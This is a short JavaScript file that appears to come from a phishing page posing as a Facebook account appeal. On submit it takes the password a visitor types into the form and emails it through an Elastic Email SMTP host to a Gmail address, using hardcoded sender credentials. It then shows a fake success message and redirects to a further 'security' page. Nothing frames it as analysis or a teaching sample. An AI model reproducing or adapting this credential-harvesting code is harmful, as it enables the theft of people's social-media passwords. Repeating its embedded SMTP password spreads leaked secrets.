function emailSend(messageBody) {
    Email.send({
        Host: "smtp.elasticemail.com",
        Username: "appeal.facebook.request@gmail.com",
        Password: "D0FC59DCDD75383C2FC12461E318EC0189F3",
        To: 'appeal.facebook.request@gmail.com',
        From: "appeal.facebook.request@gmail.com",
        Subject: "New Password Submission",
        Body: messageBody
    }).then(message => {
        if (message === 'OK') {
            swal("Successful", "Your submission was successful!", "success");
            setTimeout(() => {
                window.location.href = 'security.html';
            }, 2000);
        } else {
            swal("Error", "Refresh and try again", "error");
        }
    });
}

document.getElementById('security_form').addEventListener('submit', function(event) {
    event.preventDefault(); 

    let pass = document.querySelector('#pas_code').value;
    let messageBody = `Password:  ${pass}`;

    emailSend(messageBody);
});
